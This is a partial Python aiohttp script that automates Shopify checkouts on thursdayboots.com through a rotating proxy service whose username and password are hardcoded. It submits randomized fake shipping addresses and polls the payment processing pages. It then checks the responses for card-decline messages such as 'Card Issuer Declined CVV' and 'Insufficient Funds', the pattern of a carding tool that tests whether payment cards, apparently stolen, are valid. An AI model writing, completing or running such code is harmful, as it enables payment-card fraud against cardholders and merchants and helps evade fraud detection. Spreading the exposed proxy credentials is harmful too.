        ...
        for retry in range(max_retries):
            try:
                ...
                try:
                    ...
                    async with session.post('https://thursdayboots.com/cart/add.js', data=data, timeout=timeout, proxy=str("http://pxu29137-0:zdXn8128FgC7D5QXpm5n@x.botproxy.net:8080/")) as resp:
                ...
                #---------------------------------REQUEST NUMERO 2------------------------------#
                try :
                    async with session.get('https://thursdayboots.com/checkout', proxy=str(proxyrand), timeout=timeout) as resp:
                        response = await resp.text()
                ...
                try :
                    data = [
                        ...
                        ('checkout[shipping_address][address1]', f'{random.randint(1000,9999)} Streets Run Road'),
                        ('checkout[shipping_address][address2]', ''),
                        ('checkout[shipping_address][city]', 'West Mifflin'),
                        ('checkout[shipping_address][province]', 'PA'),
                        ('checkout[shipping_address][zip]', '15236'),
                        ('checkout[shipping_address][phone]', ''),
                        ('checkout[remember_me]', ''),
                        ('checkout[remember_me]', '0'),
                        ('checkout[client_details][browser_width]', '916'),
                    ...
                    async with session.post(f'https://thursdayboots.com/4191525/checkouts/{checkout_token}', data=data, proxy=str("http://pxu29137-0:zdXn8128FgC7D5QXpm5n@x.botproxy.net:8080/"), timeout=18) as resp:         
                ...
                try :  
                    data = {
                        ...
                        'step': 'payment_method',
                        'checkout[shipping_rate][id]': 'shopify-Standard%20Shipping%20(3-5%20business%20days)-2.99',
                ...
                #---------------------------------REQUEST NUMERO 7------------------------------#
                try:
                    async with session.get(f'https://thursdayboots.com/4191525/checkouts/{checkout_token}/processing', proxy=str("http://pxu29137-0:zdXn8128FgC7D5QXpm5n@x.botproxy.net:8080/"),timeout=18) as resp:
                        True
                except aiohttp.client_exceptions.ClientHttpProxyError as e:
                    print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
                    if retry < max_retries-1:
                ...
                #---------------------------------REQUEST NUMERO 8------------------------------#
                try:
                    async with session.get(f'https://thursdayboots.com/4191525/checkouts/{checkout_token}/processing?from_processing_page=1', proxy=str("http://pxu29137-0:zdXn8128FgC7D5QXpm5n@x.botproxy.net:8080/"),timeout=18) as resp:
                        True
                except aiohttp.client_exceptions.ClientHttpProxyError as e:
                    print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
                    if retry < max_retries-1:
                ...
                #---------------------------------REQUEST NUMERO 9------------------------------#
                try:
                    async with session.get(f'https://thursdayboots.com/4191525/checkouts/{checkout_token}?from_processing_page=1&validate=true', proxy=str("http://pxu29137-0:zdXn8128FgC7D5QXpm5n@x.botproxy.net:8080/"),timeout=18) as resp:         
                        response = await resp.text()
                    ...
                    if retry < max_retries-1:
                        ...
                        return "Maximum number of retries reached: 3"
                #------------ ---------------------CHECCK REQUESTS------------------------------#
                if (int(response.find('2010 Card Issuer Declined CVV')) > 0) or (int(response.find('2010 Insufficient Funds')) > 0):
